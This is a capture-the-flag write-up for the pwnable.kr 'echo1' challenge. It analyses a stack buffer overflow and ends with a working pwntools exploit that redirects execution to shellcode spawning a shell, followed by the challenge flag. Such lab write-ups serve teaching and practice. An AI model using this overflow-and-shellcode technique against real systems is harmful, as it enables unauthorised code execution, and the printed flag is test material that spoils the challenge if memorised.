# echo1

## Description

echo1 - 25 pt

> Pwn this echo service. <br><br>
> download : http://pwnable.kr/bin/echo1 <br><br>
> Running at : nc pwnable.kr 9010


## Solution

### Understanding the binary

Let's start by checking what kind of file it is:

```bash
$ file login
echo1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fa367b7e8f66b68737a56333996d80f0d72e54ea, not stripped
```

Nothing special here. Now, let's check the security features:

```bash
$ checksec --file=login
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX disabled   No PIE
```

It looks like there are no standard mitigations enabled. Usually, when the NX bit is not set and there is no stack canary, we'll need to return to the stack and execute shellcode.

For now, let's stop speculating and check the binary in IDA.

**main:**
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rax
  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF
  _QWORD v6[4]; // [rsp+10h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ");
  __isoc99_scanf("%24s", v6);
  v3 = o;
  *(_QWORD *)o = v6[0];
  v3[1] = v6[1];
  v3[2] = v6[2];
  id = v6[0];
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  for ( i = 0; i != 121; i = getchar() )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ");
        __isoc99_scanf("%d", &i);
        getchar();
        if ( i > 3 )
          break;
        ((void (*)(void))func[i - 1])();
      }
      if ( i == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)");
  }
  puts("bye");
  return 0;
}
```

**echo1:**
```
__int64 echo1()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(s, 128LL);
  puts(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

**echo2:**
```
__int64 echo2()
{
  puts("not supported");
  return 0LL;
}
```
echo3 is the same, byebye and greetings are simply printing strings, and get_input is a wrapper for fgets.

The program allocates a 5 * 8 bytes buffer (or in other words, a buffer that stores 5 addresses). In the last two indexes of the buffer, it stores the addresses of the `greetings` and `byebye` functions. Then, it reads 24 bytes from the user into the first three indexes of the buffer, and stores the address in the buffer at `id`.

After that, the program enters a loop in which it prompts the use for an index, and according to that index it does one of the following:
* calls `echo1`
* calls `echo2`
* calls `echo3`
* exists the loop

### Exploit

Most of the code is irrelevant, so let's focus on the important part. In `echo1` the program calls `get_input` with a buffer of size 128, on a buffer of size 32. 

Our goal is to overwrite the return address of `echo1` with the address of some `jmp rsp` call and then, overwrite the following bytes with shellcode calling `execve("/bin/sh", 0, 0)`.

And so, the challenge is to find a `jmp rsp` gadget in the binary. Unfourtenatly, running `ROPgadget` doesn't yield anything useful, and so does searching the binary for the bytes `FF E4` (the opcode of `jmp rsp`) with  `next(elf.search(asm('jmp rsp')))`. 

However, we can go in a different approach. Instead of searching for a `jmp rsp` gadget, we build ourselves one! Remember that the first 8 bytes of the input are saved at `id`. We can save there the opecode of `jmp rsp` and then overwrite the return address with the address of `id`. 

**Note:** When running the exploit on a local copy of the binary, it might not work for you. On older kernels, when compiling the executable with `-zexecstack` (making the stack executable), the data sections might be loaded as executable too (Which is why or exploit works on the pwnable.kr server). However, they might not be executable on newer kernels.

### Exploit code

```python
from pwn import *

elf = context.binary = ELF('./echo1')
conn = remote('pwnable.kr', 9010)

open_shell = asm(shellcraft.amd64.linux.sh())
jmp_rsp = asm('jmp rsp')

# give "jmp rsp" opcode as name to be saved under id
conn.sendline(jmp_rsp) 

# choose BOF echo 
conn.sendline(b'1')

# overwriting retaddr with the adress of id and the rest of the stack with shellcode 
conn.sendline(b'A' * 40 + p64(0x6020A0) + open_shell)

conn.interactive()
```

```
H4d_som3_fun_w1th_ech0_ov3rfl0w
```